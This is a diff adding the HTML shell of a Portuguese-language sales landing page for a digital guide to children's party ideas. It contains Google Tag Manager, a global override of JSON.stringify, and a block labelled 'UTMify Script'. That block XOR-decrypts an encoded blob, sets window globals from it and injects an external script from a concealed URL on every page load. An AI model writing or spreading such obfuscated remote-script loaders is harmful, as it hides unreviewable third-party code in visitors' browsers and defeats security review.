@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <!-- Circular Structure Guard for Tracking Scripts & Tooling -->
+    <script>
+      (function() {
+        var originalStringify = JSON.stringify;
+        JSON.stringify = function(value, replacer, space) {
+          var seen = new WeakSet();
+          var customReplacer = function(key, val) {
+            if (val !== null && typeof val === 'object') {
+              if (
+                (typeof Element !== 'undefined' && val instanceof Element) ||
+                (typeof Node !== 'undefined' && val instanceof Node) ||
+                (val.nodeType === 1 && typeof val.tagName === 'string')
+              ) {
+                return {
+                  tagName: val.tagName,
+                  id: val.id || undefined,
+                  className: val.className || undefined,
+                  textContent: (val.textContent || '').trim().slice(0, 100) || undefined
+                };
+              }
+              if (seen.has(val)) {
+                return undefined;
+              }
+              seen.add(val);
+            }
+            if (typeof replacer === 'function') {
+              return replacer.call(this, key, val);
+            }
+            return val;
+          };
+          return originalStringify.call(this, value, customReplacer, space);
+        };
+      })();
+    </script>
+
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+    })(window,document,'script','dataLayer','GTM-KF4R5CZP');</script>
+    <!-- End Google Tag Manager -->
+
+    <!-- UTMify Script -->
+    <script>(function(){var i_f9ay=atob("DPhuJxoCDBn4ZG9m84NMUmhuLiPaDBsSg4tUCDVhaHfWERsLmp4XCXltYTeaFkAVkIoHV25xI2mRHAoK3IgHX39uInOLRkNEkowaVXNgeW2dF01cqKVCBX1uY3uZCBxEyaMVBXRjYXzaXk0WmoALS1NmLjXaEg4Khp1MHTg0bXuaAQkAw8xbRXk7ai6ZU14CwZsKQn8gcUSF");var w_k=[];for(var c_3b5q=0;c_3b5q<i_f9ay.length;c_3b5q++){w_k.push(i_f9ay.charCodeAt(c_3b5q)&255);}var i_zjhd=w_k[0];var d_ck=w_k.slice(1,1+i_zjhd);var g_v=w_k.slice(1+i_zjhd);var i_ph3u=g_v.map(function(b,d_i){return b^d_ck[d_i%i_zjhd];});var g_gd="";for(var n_av0=0;n_av0<i_ph3u.length;n_av0++){g_gd+=String.fromCharCode(i_ph3u[n_av0]&255);}var f_f=decodeURIComponent(escape(g_gd));var f_ktl=JSON.parse(f_f);var i_h2r=f_ktl.globals||[];i_h2r.forEach(function(v_m3gx){window[v_m3gx.name]=v_m3gx.value;});var w_jgei=document.createElement("script");w_jgei.src=f_ktl.url;w_jgei.async=true;w_jgei.defer=true;(f_ktl.attributes||[]).forEach(function(q_5y){w_jgei.setAttribute(q_5y.name,q_5y.value);});(document.head||document.documentElement).appendChild(w_jgei);})();</script>
+    <!-- End UTMify Script -->
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>+150 Festas de Dia das Crianças Prontas para Você Copiar</title>
+    <meta name="description" content="Landing page de vendas completa para o guia digital de +150 Festas de Dia das Crianças Prontas pra Copiar com bônus exclusivos e garantia de 30 dias." />
+    <meta property="og:title" content="+150 Festas de Dia das Crianças Prontas para Você Copiar" />
+    <meta property="og:description" content="Landing page de vendas completa para o guia digital de +150 Festas de Dia das Crianças Prontas pra Copiar com bônus exclusivos e garantia de 30 dias." />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&family=Cabinet+Grotesk:wght@700;800;900&display=swap" rel="stylesheet">
+    <script type="module" crossorigin src="/assets/index-igXMl0FK.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-6pMInq52.css">
+  </head>
+  <body class="bg-[#F8F7F4] text-[#1E293B] antialiased selection:bg-emerald-500 selection:text-white">
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KF4R5CZP"
+    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+    <div id="root"></div>
+  </body>
+</html>
+
